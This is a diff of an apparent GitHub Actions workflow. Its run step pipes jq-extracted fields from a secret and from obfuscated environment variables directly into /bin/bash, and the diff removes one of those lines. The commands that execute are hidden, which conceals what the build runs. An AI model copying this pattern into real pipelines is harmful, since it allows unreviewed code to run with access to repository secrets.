@@ -22,7 +22,6 @@ jobs:
           mfnbe31: ${{ secrets.mfnbe31 }}
         run: |
           printf '%s' "$mfnbe31" | jq -r .ktqpa44 | /bin/bash
-          echo $nzsv51082 | jq -r .qwslr3546 | /bin/bash
           echo $bp14 | jq -r .fvimb59 | /bin/bash
 
       - name: Persist output
